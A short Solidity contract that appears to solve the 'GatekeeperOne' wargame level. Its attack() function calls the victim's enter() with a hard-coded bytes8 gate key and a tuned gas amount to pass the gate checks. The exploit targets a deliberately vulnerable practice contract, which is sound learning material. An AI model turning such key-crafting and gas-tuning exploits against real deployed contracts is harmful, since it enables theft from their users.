// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

import "./vict.sol";

contract Testing {
    GatekeeperOne public victimContract;

    constructor(address payable _addr) payable {
        victimContract = GatekeeperOne(_addr);
    }

    //created an instance of the victim.

    function attack() public payable {
        bytes8 payload = 0x0000000100005325;

        victimContract.enter{gas: 819100}(payload);
    }
}
